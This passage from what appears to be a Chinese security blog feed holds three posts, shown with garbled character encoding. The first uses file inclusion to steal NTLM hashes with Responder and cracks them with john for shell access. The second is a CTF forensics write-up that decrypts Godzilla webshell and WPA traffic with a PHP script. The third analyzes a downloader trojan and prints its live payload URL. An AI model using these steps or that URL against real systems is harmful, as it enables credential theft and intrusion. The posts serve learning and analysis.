class="hljs-string">&#x27;root.php&#x27;</span>;<br>echo <span class="hljs-string">&quot;A $color $fruit&quot;</span>; <span class="hljs-comment">// output = &quot;A green apple&quot;</span><br>?&gt;<br></code></pre></td></tr></table></figure><p>å½“test.phpåŒ…å«ï¼ˆincludeï¼‰root.phpåï¼ŒcoloråŠfruitå°±è¢«èµ‹äºˆå€¼äº†</p><p>é‚£ä¹ˆå¦‚ä½•è¿›ä¸€æ­¥åˆ©ç”¨å‘¢ï¼Ÿä¸¤ç§æ€è·¯:ä¸€æ˜¯å†™å…¥æˆ–åŒ…å«è¿œç¨‹åé—¨æ–‡ä»¶ï¼Œåšæƒé™çš„ç»´æŒï¼›äºŒæ˜¯ç»§ç»­ä¿¡æ¯æ”¶é›†ç³»ç»Ÿçš„è´¦å·å¯†ç ä¿¡æ¯ï¼Œè¿›è¡ŒPTHç­‰æ“ä½œï¼Œæˆ‘ä»¬å…ˆæµ‹è¯•ä¸€ä¸‹è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼Œæˆ‘ä»¬çŸ¥é“è¿œç¨‹æ–‡ä»¶åŒ…å«è¿˜éœ€è¦ä¸¤ä¸ªæ¡ä»¶ï¼šallow_url_includeã€allow_url_fopenè¦ä¸ºâ€œONâ€ï¼Œè€Œæœ¬åœ°æ–‡ä»¶åŒ…å«åˆ™ä¸éœ€è¦ï¼Œæµ‹è¯•ä¸€ä¸‹ï¼Œç›´æ¥æŠ¥é”™ï¼Œè¯´æ˜ä¸å­˜åœ¨è¿œç¨‹æ–‡ä»¶åŒ…å«</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">page</span>=http://www.baidu.com<br></code></pre></td></tr></table></figure><img src="/2024/03/05/SMB%E7%AA%83%E5%8F%96NTLMhash/2024-03-05_11-09.png" class="" title="2024-03-05_11-09.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><h2 id="åˆ©ç”¨SMBçªƒå–NTLM-hash"><a href="#åˆ©ç”¨SMBçªƒå–NTLM-hash" class="headerlink" title="åˆ©ç”¨SMBçªƒå–NTLM hash"></a>åˆ©ç”¨SMBçªƒå–NTLM hash</h2><p>SMB åè®®æ”¯æŒ NTLM å’Œ LM åŠ å¯†ï¼Œæˆ‘ä»¬é€šè¿‡æ¶æ„ç¨‹åºç›‘å¬ï¼Œåœ¨è¿œç¨‹ä¸»æœºè®¿é—®æˆ‘ä»¬çš„ SMB æœåŠ¡æ—¶ï¼Œå› ä¸ºè¦è¿›è¡Œèº«ä»½éªŒè¯ï¼Œä¼šå‘é€ç›¸å…³ä¿¡æ¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥è·å–ç›®æ ‡ä¸»æœºçš„ hash å€¼ï¼Œè¿™ä¸ªæ˜¯ä¸ºäº†è´¦å·å¯†ç çš„å®‰å…¨æ€§ï¼Œä¸€èˆ¬éƒ½ä¸è¿›è¡Œæ˜æ–‡éªŒè¯ï¼Œè€Œæ˜¯ä½¿ç”¨æ‘˜è¦å€¼è¿›è¡Œæ¯”å¯¹ï¼Œè¿™æ ·å°±ç»™äº†æ”»å‡»è€…æœºä¼šï¼Œåœ¨ä¸éœ€è¦çŸ¥é“æ­£ç¡®çš„è´¦å·å¯†ç çš„æƒ…å†µä¸‹ï¼Œåªè¦æ‘˜è¦å€¼æ¯”å¯¹æˆåŠŸå°±å¯ä»¥ç™»å½•<br>åˆ©ç”¨å·¥å…·Responderï¼Œè¿›è¡Œç›‘å¬ç½‘å¡ï¼Œç¡®å®šç›®æ ‡ä¸»æœºå’Œè·³æ¿æœºåœ¨ä¸€ä¸ªç½‘æ®µå†…ï¼Œè¿™ä¸ªæ—¶å€™å°±ä½“ç°äº†éš§é“çš„é‡è¦æ€§äº†ï¼Œæˆ‘è¿™é‡Œæ˜¯tun0</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">Responder -<span class="hljs-selector-tag">I</span> tun0<br></code></pre></td></tr></table></figure><p>ç„¶åé€šè¿‡æ–‡ä»¶åŒ…å«æ¼æ´æ„é€ payload,å¹¶æ‹¼æ¥è®¿é—®urlè§¦å‘</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?p</span>age=<span class="hljs-regexp">//</span>è·³æ¿æœº<span class="hljs-variable constant_">IP</span>/somefile<br></code></pre></td></tr></table></figure><img src="/2024/03/05/SMB%E7%AA%83%E5%8F%96NTLMhash/2024-03-05_11-23.png" class="" title="2024-03-05_11-23.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>æˆåŠŸæ¥æ”¶åˆ°æœåŠ¡å™¨çš„çš„ NTLM å€¼,ä¸€èˆ¬æ˜¯ç¬¬ä¸€æ¬¡è¯·æ±‚æ‰ä¼šå‘é€ï¼Œç„¶åä¼šä¿å­˜åˆ°æœ¬åœ°ï¼Œä¸‹æ¬¡å°±ä¸ä¼šå†å‘é€äº†</p><h2 id="NTLM-ç¢°æ’è·å–å¯ç”¨è´¦å·å¯†ç "><a href="#NTLM-ç¢°æ’è·å–å¯ç”¨è´¦å·å¯†ç " class="headerlink" title="NTLM ç¢°æ’è·å–å¯ç”¨è´¦å·å¯†ç "></a>NTLM ç¢°æ’è·å–å¯ç”¨è´¦å·å¯†ç </h2><p>è·å–åˆ° NTLM å€¼ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯æš´ç ´äº†ï¼Œå°†è·å–çš„å€¼ä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œç„¶åç”¨johnè¿›è¡Œç ´è§£ç¢°æ’ï¼Œå°±è·å–åˆ°äº†è´¦æˆ·å’Œå¯†ç </p><img src="/2024/03/05/SMB%E7%AA%83%E5%8F%96NTLMhash/2024-03-05_10-57.png" class="" title="2024-03-05_10-57.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>æ‹¿åˆ°è´¦æˆ·å¯†ç ç›´æ¥ç™»å½•è¿æ¥è·å–shellï¼Œå¹¶å¯ä»¥ä¸ºåç»­çš„å¯†ç å–·æ´’ç­‰å·¥ä½œåšå‡†å¤‡</p><img src="/2024/03/05/SMB%E7%AA%83%E5%8F%96NTLMhash/2024-03-05_11-02.png" class="" title="2024-03-05_11-02.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6>]]></content>
    
    
    <categories>
      
      <category>å†…ç½‘æ¸—é€</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å§¿åŠ¿æ€»ç»“</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Wifiå–è¯â€”â€”WPAè§£å¯†</title>
    <link href="/2024/03/05/wifi%E5%8F%96%E8%AF%81%E2%80%94%E2%80%94wpa%E8%A7%A3%E5%AF%86/"/>
    <url>/2024/03/05/wifi%E5%8F%96%E8%AF%81%E2%80%94%E2%80%94wpa%E8%A7%A3%E5%AF%86/</url>
    
    <content type="html"><![CDATA[<p>å¥½ä¹…æ²¡ç¢°CTFäº†ï¼Œé—²æ¥æ— äº‹ï¼Œæœ€è¿‘åˆ·äº†åˆ·é¢˜æ‰¾æ‰¾æ‰‹æ„Ÿ</p><p>æ‹¿åˆ°é¢˜ç›®ä¹‹åå¯ä»¥çœ‹åˆ°ï¼Œæœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªæœåŠ¡å™¨æµé‡åŒ…ï¼ˆpcapngï¼‰ï¼Œä¸€ä¸ªå®¢æˆ·ç«¯æµé‡åŒ…(cap)ï¼Œä¸€ä¸ªå†…å­˜é•œåƒï¼›é¦–å…ˆå…ˆçœ‹æœåŠ¡å™¨æµé‡ï¼Œåœ¨ç¬¬27ä¸ªæ•°æ®åŒ…ä¸­å‘ç°äº†ä¸Šä¼ æœ¨é©¬</p><img src="/2024/03/05/wifi%E5%8F%96%E8%AF%81%E2%80%94%E2%80%94wpa%E8%A7%A3%E5%AF%86/1.jpg" class="" title="1.jpg"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>å¹¶ä¸”é€šè¿‡é¢„è§ˆæ•°æ®åŒ…å¯ä»¥åŸºæœ¬åˆ¤æ–­ä¸ºå“¥æ–¯æ‹‰çš„php_eval_xor_base64æµé‡ï¼Œé€šè¿‡è¿½è¸ªä¸€ä¸‹è¯¥æ•°æ®æµï¼Œå¯ä»¥å‘ç°ä¸€ä¸²å¯†æ–‡</p><img src="/2024/03/05/wifi%E5%8F%96%E8%AF%81%E2%80%94%E2%80%94wpa%E8%A7%A3%E5%AF%86/2.png" class="" title="2.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>æˆ‘ä»¬æ‹¿å»è§£å¯†</p><img src="/2024/03/05/wifi%E5%8F%96%E8%AF%81%E2%80%94%E2%80%94wpa%E8%A7%A3%E5%AF%86/3.png" class="" title="3.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>æ‹¿åˆ°äº†shellçš„è¿æ¥å¯†ç :passï¼Œè¿™å°±æ›´åŠ è¯å®äº†æˆ‘çš„æ¨æ–­ï¼Œå› ä¸ºå“¥æ–¯æ‹‰çš„é»˜è®¤è¿æ¥å¯†ç å°±æ˜¯passï¼Œè¿˜æœ‰ä¸€ä¸ªkeyï¼Œä¸€ä¼šå¯èƒ½ä¼šç”¨çš„åˆ°ï¼Œå…ˆåšå¥½è®°å½•ï¼›éšåçœ‹äº†ä¸€ä¸‹å®¢æˆ·ç«¯æµé‡ï¼ˆ.capï¼‰ï¼Œå‘ç°åšäº†WPAåŠ å¯†ï¼Œæƒ³è§£å¯†çš„è¯ï¼Œéœ€è¦æ‰¾åˆ°SSIDå’Œå¯†ç ï¼Œè€Œæˆ‘ä»¬é€šè¿‡å·²çŸ¥çš„æ•°æ®åŒ…å¯ä»¥çœ‹åˆ°SSIDï¼ŒSSIDä¸ºMy_Wifi</p><img src="/2024/03/05/wifi%E5%8F%96%E8%AF%81%E2%80%94%E2%80%94wpa%E8%A7%A3%E5%AF%86/4.jpg" class="" title="4.jpg"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>å…¶ä»–çš„å†æ— å¯åˆ©ç”¨çš„ä¿¡æ¯ï¼Œç„¶åæˆ‘ä»¬å»å–è¯åˆ†æä¸€ä¸‹é‚£ä¸ªå†…å­˜é•œåƒæ–‡ä»¶ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æ‰¾åˆ°ä¸€äº›æœ‰ä»·å€¼çš„ä¸œè¥¿ï¼Œæ˜¯ä¸ªwin7</p><img src="/2024/03/05/wifi%E5%8F%96%E8%AF%81%E2%80%94%E2%80%94wpa%E8%A7%A3%E5%AF%86/5.jpg" class="" title="5.jpg"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><p>å»æ‰¾ä¸€ä¸‹My_Wifiç›¸å…³æ–‡ä»¶ï¼Œå‘ç°æœ‰ä¸€ä¸ªzipå‹ç¼©åŒ…æ–‡ä»¶ï¼Œæˆ‘ä»¬å°†ä»–æå–å‡ºæ¥</p><img src="/2024/03/05/wifi%E5%8F%96%E8%AF%81%E2%80%94%E2%80%94wpa%E8%A7%A3%E5%AF%86/6.jpg" class="" title="6.jpg"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>æå–å‡ºæ¥ä¹‹åï¼Œå°è¯•è§£å‹ï¼Œå‘ç°éœ€è¦å¯†ç ï¼Œå¹¶ä¸”å¯†ç æç¤ºè¯´æ˜¯ç½‘å¡çš„GUIDï¼Œè€Œæˆ‘ä»¬çŸ¥é“windowsæ“ä½œç³»ç»Ÿä¸­ç½‘å¡çš„GUIDå’Œæ¥å£Interfacesç»‘å®šï¼Œäºæ˜¯æˆ‘ä»¬è¿‡æ»¤å…³é”®å­—â€œInterfacesâ€è¿›è¡Œæ–‡ä»¶æœç´¢</p><img src="/2024/03/05/wifi%E5%8F%96%E8%AF%81%E2%80%94%E2%80%94wpa%E8%A7%A3%E5%AF%86/7.png" class="" title="7.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>å¾—åˆ°äº†GUIDï¼š{529B7D2A-05D1-4F21-A001-8F4FF817FC3A}ï¼Œä¹Ÿå°±å¾—åˆ°äº†å‹ç¼©åŒ…çš„å¯†ç ï¼Œæˆ‘ä»¬å°è¯•è¿›è¡Œè§£å‹ï¼Œè§£å‹æˆåŠŸï¼Œè§£å‹å‡ºæ¥äº†ä¸€ä¸ªxmlæ–‡ä»¶ï¼Œåœ¨xmlæ–‡ä»¶é‡Œæ‰’åˆ°äº†SSIDå’Œå¯†ç </p><img src="/2024/03/05/wifi%E5%8F%96%E8%AF%81%E2%80%94%E2%80%94wpa%E8%A7%A3%E5%AF%86/8.jpg" class="" title="8.jpg"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>æ‹¿åˆ°SSIDå’Œå¯†ç ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿›è¡ŒAirdecap-ngè¿›è¡Œæ— çº¿æ”»å‡»ç ´è§£</p><img src="/2024/03/05/wifi%E5%8F%96%E8%AF%81%E2%80%94%E2%80%94wpa%E8%A7%A3%E5%AF%86/9.png" class="" title="9.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>ç ´è§£ä¹‹åå°±ä¼šå‡ºç°ä¸€ä¸ªå…¨æ–°çš„æ•°æ®åŒ…ï¼Œåœ¨æœ€åä¸€ä¸ªtcpæ•°æ®æµçš„æœ«å°¾æ‰¾åˆ°äº†ä¸€ä¸²æ–°çš„å¯†æ–‡</p><img src="/2024/03/05/wifi%E5%8F%96%E8%AF%81%E2%80%94%E2%80%94wpa%E8%A7%A3%E5%AF%86/10.png" class="" title="10.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>å†åŠ ä¸Šå‰é¢æˆ‘ä»¬å·²ç»è·å–åˆ°å“¥æ–¯æ‹‰çš„keyï¼Œæ‰€ä»¥åªéœ€è¦å¯¹è¿™ä¸€ä¸²å¯†æ–‡è¿›è¡Œå“¥æ–¯æ‹‰è§£å¯†ï¼Œå°±å¯ä»¥æ‹¿åˆ°flag<br>è§£å¯†è„šæœ¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;3c6e0b8a9c15224a&#x27;</span>;<br><span class="hljs-variable">$key1</span>=<span class="hljs-string">&quot;å¯†æ–‡&quot;</span>;<br><span class="hljs-variable">$str</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$key1</span>,<span class="hljs-number">16</span>,-<span class="hljs-number">16</span>);<br><span class="hljs-variable">$str</span>=<span class="hljs-title function_ invoke__">gzdecode</span>(<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$str</span>),<span class="hljs-variable">$key</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>;<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è§£å¯†å³å¯æ‹¿åˆ°flag</p><img src="/2024/03/05/wifi%E5%8F%96%E8%AF%81%E2%80%94%E2%80%94wpa%E8%A7%A3%E5%AF%86/12.png" class="" title="12.png">]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç”µå­å–è¯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Downloaderç—…æ¯’æ ·æœ¬åˆ†æ</title>
    <link href="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    <url>/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>Downloaderæ˜¯ä¸€ç±»è®¡ç®—æœºç—…æ¯’ç¨‹åºï¼ŒæŒ‰ç…§å›½é™…ä¸Šçš„ç—…æ¯’å‘½åæƒ¯ä¾‹ä¸ºâ€œTrojan-Downloaderâ€ä¸€ç±»ï¼Œè¿™ç±»æœ¨é©¬ç¨‹åºçš„ä¸»è¦å†…å®¹ä¸ºï¼šæŒ‡å¼•ä¸­æ¯’ç”¨æˆ·çš„è®¡ç®—æœºåˆ°æ”»å‡»è€…æŒ‡å®šçš„urlåœ°å€å»ä¸‹è½½æ›´å¤šçš„ç—…æ¯’æ–‡ä»¶å¹¶è¿è¡Œï¼Œä½¿å¾—æ”»å‡»è€…è·å¾—æ›´å¤§æ“ä½œæƒé™</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_11-06.png" class="" title="2024-03-04_11-06.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>æ‹¿åˆ°æ ·æœ¬ï¼Œå¯ä»¥ä»è¿™å‡ ä¸ªè§’åº¦å…¥æ‰‹ï¼š</p><p>å­—ç¬¦ä¸²ï¼šæœ‰å‡ ç‡å¯ä»¥è·å¾—ç¨‹åºåŠŸèƒ½ç›¸å…³çš„æç¤º<br>æŸ¥å£³ï¼šæŸ¥çœ‹ç¨‹åºæ˜¯å¦æœ‰è¿›è¡ŒåŠ å¯†åŠ å£³å‹ç¼©ç­‰<br>PEæ–‡ä»¶æ ¼å¼ï¼šä»PEå¤´ä¸­å¯ä»¥è·å–ç¨‹åºçš„ä¸€äº›ä¿¡æ¯ï¼Œä¾‹å¦‚ç¼–è¯‘ä¿¡æ¯ã€ç©ºé—´è¦æ±‚ç­‰<br>é“¾æ¥åº“å’Œå‡½æ•°ï¼šä»ç¨‹åºçš„é“¾æ¥åº“ä¸­å¯ä»¥åˆæ­¥æ¨æ–­ç¨‹åºçš„åŠŸèƒ½ï¼ŒæŸ¥çœ‹DLLï¼Œå¯¼å…¥è¡¨</p><h2 id="æ ·æœ¬åˆ†æ"><a href="#æ ·æœ¬åˆ†æ" class="headerlink" title="æ ·æœ¬åˆ†æ"></a>æ ·æœ¬åˆ†æ</h2><h3 id="åŸºç¡€åˆ†æ"><a href="#åŸºç¡€åˆ†æ" class="headerlink" title="åŸºç¡€åˆ†æ"></a>åŸºç¡€åˆ†æ</h3><p>åˆ†æPEæ ¼å¼ä¸æŸ¥å£³ï¼Œå‘ç°æ— å£³ï¼Œç¼–è¯‘æ—¶é—´æ˜¯2002-05-09ï¼Œç®—æ˜¯æ¯”è¾ƒè€çš„ä¸€ä¸ªç—…æ¯’æ ·æœ¬ï¼Œæ˜¯ä¸ªGUIç¨‹åº</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_12-42.png" class="" title="2024-03-04_12-42.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>åˆ†æå­—ç¬¦ä¸²ï¼Œé™¤äº†è°ƒç”¨çš„å‡½æ•°åå’ŒåŠ¨æ€é“¾æ¥åº“ä¹‹å¤–ï¼Œå­—ç¬¦ä¸²é‡ŒåŒ…å«äº†ä»¥ä¸‹å…³é”®ä¿¡æ¯ï¼š<br>ä¸€ä¸ªç½‘å€ï¼šdload.ipbill.comï¼Œè¿˜æœ‰ä¸ªURIï¼š<a href="http://dload.ipbill.com/del/cmb_211826.exe">http://dload.ipbill.com/del/cmb_211826.exe</a><br>è¿˜æœ‰HTTPè¯·æ±‚å¤´çš„å­—ç¬¦ä¸²<br>æ–‡ä»¶ç›¸å…³ï¼šc:\dialler.exe<br>å¯ä»¥è®¤ä¸ºç»“åˆè¿™äº›å†…å®¹å¯ä»¥åˆæ­¥çŒœæµ‹ï¼Œè¯¥ç¨‹åºä¼šä»ç½‘ç«™ä¸Šä¸‹è½½ä¸€ä¸ªæ–‡ä»¶cmb_211826.exeï¼Œä¿å­˜åˆ°C:\dialler.exe</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_12-42_1.png" class="" title="2024-03-04_12-42_1.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>åˆ†æç›¸å…³å‡½æ•°ï¼Œå‘ç°äº†æœ‰æ–‡ä»¶æ“ä½œç›¸å…³APIï¼šWriteFileå’ŒCreateFile,åº”è¯¥æ˜¯å†™å…¥æ–‡ä»¶çš„ï¼Œè¿˜æœ‰ä¸ªCreateThreadï¼Œåº”è¯¥ç”¨æ¥åˆ›å»ºåŠŸèƒ½çº¿ç¨‹ä½¿ç”¨ï¼ŒShellExecuteAï¼Œç”¨æ¥æ‰§è¡Œä¸‹è½½çš„ç¨‹åºï¼Œåˆ°è¿™é‡Œå·²ç»å¯ä»¥æ‘¸æ¸…ä¸€ä¸ªå¤§æ¦‚è¡Œä¸ºäº†ï¼Œè¿™ä¸ªç¨‹åºçš„åŠŸèƒ½å°±æ˜¯ä»ç½‘ä¸Šä¸‹è½½ä¸€ä¸ªexeæ‰§è¡Œ</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_12-43.png" class="" title="2024-03-04_12-43.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><h3 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h3><h4 id="å®šä½å…³é”®å‡½æ•°"><a href="#å®šä½å…³é”®å‡½æ•°" class="headerlink" title="å®šä½å…³é”®å‡½æ•°"></a>å®šä½å…³é”®å‡½æ•°</h4><p>é¦–å…ˆæ˜¯ç¨‹åºOEPï¼šç¨‹åºé¦–å…ˆæ˜¯é€šè¿‡xor eax,eaxçš„æ“ä½œå°†eaxèµ‹å€¼ä¸º0ï¼Œç„¶åå››ä¸ªpushåˆ†åˆ«å°†0å…¥æ ˆï¼Œæœ€åé€šè¿‡call sub_401499è¿™é‡Œã€‚ä»åæ±‡ç¼–ä»£ç ä¸­ï¼Œå¯ä»¥çœ‹åˆ°å¹¶æ²¡æœ‰å°†è¿”å›åœ°å€å…¥æ ˆçš„æ“ä½œï¼Œç¨‹åºå…¶å®æ˜¯é€šè¿‡callæ‰§è¡Œæ­¤æ“ä½œçš„ï¼ŒcallæŒ‡ä»¤æˆ‘ä»¬å¯ä»¥ç†è§£ä¸ºå‡½æ•°è°ƒç”¨ï¼ŒcallæŒ‡ä»¤åé¢ä¼šè·Ÿä¸€ä¸ªåœ°å€ï¼Œè¿™é‡Œæ˜¯sub_401499è¡¨ç¤ºcallä¼šè·³è½¬åˆ°401499è¿™ä¸ªåœ°å€ï¼Œè¿™é‡Œè°ƒç”¨äº†ä¸»å‡½æ•°ï¼Œç„¶åæ‰§è¡Œå®Œä¹‹åé€€å‡ºè¿›ç¨‹ï¼Œå‚æ•°æ˜¯4ä¸ª0</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_12-50.png" class="" title="2024-03-04_12-50.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_12-48.png" class="" title="2024-03-04_12-48.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>è¿›å…¥ä¸»ç¨‹åºsub_401499ï¼šåŠŸèƒ½è¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œæ˜¯å¸¸è§çš„æ³¨å†Œçª—å£ç±»ï¼Œåˆ›å»ºçª—å£ï¼Œåˆ›å»ºæˆåŠŸå°±è¿›å…¥æ¶ˆæ¯å¾ªç¯ï¼Œå¦åˆ™å°±é€€å‡ºç¨‹åºï¼Œè¿™ä¸€å±‚æ²¡å•¥æ¶æ„è¡Œä¸ºå‡ºç°ï¼Œä½†æ˜¯è°ƒç”¨äº†ä¸¤ä¸ªè‡ªå†™å‡½æ•°</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_13-01.png" class="" title="2024-03-04_13-01.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>ç¬¬ä¸€ä¸ªè‡ªå†™å‡½æ•°sub_401437åŠŸèƒ½å°±æ˜¯æ³¨å†Œçª—å£ç±»ï¼Œç„¶åæ¥ç€å°±è¿”å›</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_13-09.png" class="" title="2024-03-04_13-09.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>ç¬¬äºŒä¸ªè‡ªå†™å‡½æ•°sub_4013A3ï¼šè¿™ä¸ªå‡½æ•°é¦–å…ˆæ˜¯æŸ¥è¯¢äº†ä¸€ä¸ªç³»ç»Ÿå‚æ•°ï¼Œç„¶åè°ƒç”¨CreateWindowExAå»åˆ›å»ºçª—å£ï¼Œå¦‚æœåˆ›å»ºå¤±è´¥å°±è¿”å›ï¼Œåˆ›å»ºæˆåŠŸåæ¥ç€å¾€ä¸‹è·‘</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_13-13.png" class="" title="2024-03-04_13-13.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>çª—å£åˆ›å»ºæˆåŠŸä¹‹åï¼Œè°ƒç”¨ShowWindowæ˜¾ç¤ºçª—å£ï¼Œç„¶åè°ƒç”¨CreateThreadåˆ›å»ºäº†ä¸€ä¸ªçº¿ç¨‹ï¼Œçº¿ç¨‹å‡½æ•°æ˜¯è¿™ä¸ªStartAddressï¼Œå—¯..å°±è§‰å¾—è¿™ä¸ªçº¿ç¨‹æ€ªæ€ªçš„</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_13-28.png" class="" title="2024-03-04_13-28.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><h4 id="ä¸‹è½½è¡Œä¸ºåˆ†æ"><a href="#ä¸‹è½½è¡Œä¸ºåˆ†æ" class="headerlink" title="ä¸‹è½½è¡Œä¸ºåˆ†æ"></a>ä¸‹è½½è¡Œä¸ºåˆ†æ</h4><p>æŒç»­è¿½è¸ªè¿™ä¸ªçº¿ç¨‹å‡½æ•°ï¼Œå¯ä»¥å‘ç°å®ƒé¦–å…ˆè°ƒç”¨äº†ä¸€ä¸ªè‡ªå†™å‡½æ•°sub_401068ï¼ŒåŠŸèƒ½æ˜¯ä»æŒ‡å®šURIä¸‹è½½å†…å®¹ï¼Œä¿å­˜åˆ°ç¼“å†²åŒº</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_14-03.png" class="" title="2024-03-04_14-03.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>éšååˆ†æè¿™ä¸ªå­å‡½æ•°å‘ç°ï¼Œåªæ˜¯ä¸€äº›å¾ªç¯æ“ä½œï¼Œä¸æ˜ç™½æ˜¯ä»€ä¹ˆæ„æ€ï¼Œä¼°è®¡å¯èƒ½åº”è¯¥æ˜¯å»¶æ—¶çš„ç›®çš„</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_14-06.png" class="" title="2024-03-04_14-06.png"><h6 id="-11"><a href="#-11" class="headerlink" 